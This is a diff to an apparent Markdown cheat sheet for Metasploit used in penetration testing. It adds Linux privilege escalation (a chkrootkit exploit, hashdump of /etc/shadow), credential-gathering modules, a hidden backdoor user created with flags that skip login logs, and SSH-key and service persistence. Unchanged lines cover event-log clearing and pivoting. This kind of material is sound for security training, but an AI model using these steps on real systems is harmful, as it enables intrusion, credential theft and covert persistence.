@@ -30,14 +30,22 @@ Metasploit Framework
 	9. [Privilege Escalation](#Privilege_Escalation)
 		1. [UAC Bypass](#UAC_Bypass)
 		2. [Token Impersonation](#Token_Impersonation)
-		3. [Pass-The-Hash](#Pass-The-Hash)
+		3. [Mimikatz](#Mimikatz)
+		4. [Pass-The-Hash](#Pass-The-Hash)
+		5. [chkrootkit Exploit](#chkrootkit_Exploit)
 	10. [Persistance](#Persistance)
 		1. Windows
-			1. [Enableing RDP](#Enableing_RDP)
+			1. [Shell Service](#Shell_Service)
+			2. [Enableing RDP](#Enableing_RDP)
+		3. Linux
+			1. [Add User Manual](#Add_User_Manual)
+			2. [SSH-Key](#SSH-Key)
+			3. [Service Persistence](#Service_Persistence)
 	11. [Post](#Post)
 		1. Windows
 			1. [Keylogging](#Keylogging)
 			2. [EventLogs](#EventLogs)
+			3. [Pivoting Windows](#Pivoting-Windows)
 
 
 
@@ -357,6 +365,16 @@ Depends on workspace and modules ran within
 - `post/linux/gather/checkcontainer` : check if container
 - `post/linux/gather/checkvm` : check if vm
 - `post/linux/gather/enum_users_history` : grab bash history for users
+##### Other notable Modules
+- `post/multi/gather/ssh_creds`
+- `post/multi/gather/docker_creds`
+- `post/linux/gather/hashdump`
+- `post/linux/gather/ecryptfs_creds`
+- `post/linux/gather/enum_psk`
+- `post/linux/gather/enum_xchat`
+- `post/linux/gather/phpmyadmin_credsteal`
+- `post/linux/gather/pptpd_chap_secrets`
+- `post/linux/manage/sshkey_persistence`
 
 ### Upgrade shell to meterpreter
 1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
@@ -426,12 +444,33 @@ Depends on workspace and modules ran within
 	2. `set SMBUser <user>`
 	3. `set SMBPass <LM:NTLM-Hash>`
 
+### chkrootkit_Exploit
+*Example Flow* - Linux
+1. Get meterpreter session on target
+2. `ps aux` : check running processes
+	1. root has a process running /bin/bash /bin/check-down
+	2. script that is running chkrootkit
+	3. `chkrootkit -v` : shows version
+3. `search chkrootkit` : find exploit for it
+4. `use exploit/unix/local/chkrootkit`
+	1. set options
+
+### Hashdump
+*Example Flow* - Linux
+1. Get meterpreter session on target
+2. `search hashdump` : find related modules
+3. `use post/linux/hasdump` : linux dump passwords
+	1. `set session <num>` : select meterpreter session
+	2. `run` : grab the hashes and stores them in loot
+	3. `/etc/passwd` & `/etc/shadow` & unshadowed file formatted for john 
+
 
 ---
 
 ## Persistance
 ### Windows
-*Example Flow* - Shell service
+#### Shell_Service
+*Example Flow*
 1. Get meterpreter session on target
 	1. `sysinfo` : grab what version of windows
 	2. `getuid` : need administrator access for persistance
@@ -456,6 +495,36 @@ Depends on workspace and modules ran within
 	3. `net user administrator password123` : not recommended!
 4. `xfreerdp /u:administrator /p:<pass> /v:<IP>` : login
 
+### Linux
+#### Add_User_Manual
+1. get access to target
+2. create a user account that blends in. If ftp doesn't exist already.
+	1. `useradd -mlr -d /var/www -s /bin/bash -g root -u 15 ftp`
+		1. -m : --create-home : create home with *skel*
+		2. -l : --no-log-init : don't add to *lastlog* and *faillog*
+		3. -r : --system : no aging information in /etc/shadow
+		4. -u : --uid
+		5. -g : --groups
+	2. `passwd ftp` : set password
+
+#### SSH-Key
+Easiest Way
+1. `use post/linux/manage/sshkey_persistense`
+	1. `set CREATESSHFOLDER true`
+	2. `set session <num>`
+	3. `run` : will create and add key to user(s)
+2. key is added in loot
+
+#### Service_Persistence
+Might not work and will need to tweak the target.
+1. Get access to target
+2. `search platform:linux persistence` : look up persistence modules on linux
+3. `use exploit/linux/local/servicepersistence`
+	1. `set session <num>` : select session to run on
+	2. make sure payload is good
+	3. `set LHOST <ip>` : `set LPORT <num>`
+
+
 ---
 
 ## Post
@@ -473,7 +542,7 @@ Windows Event Log clearing
 1. once you are done in a meterpreter session
 2. `clearev` : clear event log
 
-#### Pivoting-windows
+#### Pivoting-Windows
 Use a machine that is connected to another network to pivot to it.
 - You can check for networks with the following commands
 	- `route` : check routing table
@@ -491,3 +560,5 @@ Use a machine that is connected to another network to pivot to it.
 	1. `set payload windows/meterpreter/bind_tcp` : use bind payload
 	2. `set LPORT 4422` : unused port
 	3. `set RHOSTS <target2>` : target 2 ip
+
+### Linux
